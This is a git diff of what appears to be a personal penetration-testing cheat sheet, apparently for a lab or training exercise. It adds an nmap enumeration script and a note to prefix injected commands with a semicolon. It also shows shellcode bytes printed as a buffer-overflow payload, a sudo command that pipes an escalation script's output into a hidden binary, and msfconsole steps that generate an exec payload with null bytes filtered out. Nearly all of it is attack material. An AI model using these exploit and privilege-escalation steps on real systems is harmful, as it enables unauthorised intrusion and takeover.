@@ -16,6 +16,7 @@ lin_ops# firefox                                                                
 NMAP SCRIPTS
   /usr/share/nmap/scripts
 smb-os-discovery
+http-enum
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 COMMAND INJECTION
 Begin all new commands with a ;
@@ -191,12 +192,11 @@ buf += b"\x4e\x99\x50\xb2\xbf\x73\xed\x5f\xb2\xf2\x62\xfa"
 buf += b"\x51\x77\xe0\x70\xb8\x07\x8e\x1a\xc4\xb0\x1d\x53"
 buf += b"\x25\xf3\x22"
 print(buffer+eip+nop+buf)
-
-sudo /.hidden/inventory.exe <<<$(./escalation.pu)
-
-
-
-
+sudo /.hidden/inventory.exe <<<$(./escalation.py)
+  msfconsole
+use payload/linux/x86/exec
+set CMD "/.secret/.verysecret.pdb"
+generate -b '\x00' -f python
 
 
 
